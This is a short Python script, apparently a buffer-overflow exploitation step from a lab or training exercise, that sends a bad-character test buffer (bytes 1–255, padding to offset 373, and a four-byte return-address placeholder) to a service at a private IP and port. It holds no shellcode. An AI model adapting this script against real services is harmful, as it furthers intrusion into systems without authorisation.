#!/usr/bin/env python
import socket

host = "10.10.0.35"
port = 20666
offset = 373

chars = bytes([i for i in range(1, 256)])

buffer = chars + b"A" * (offset - len(chars)) + b"B" * 4 + b"C" * (400 - offset - 4)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
data = s.recv(1024)
print(data)

# print(f"fuzzing with {string}")

s.send(buffer)
# time.sleep(2)
data = s.recv(1024)
print(data)
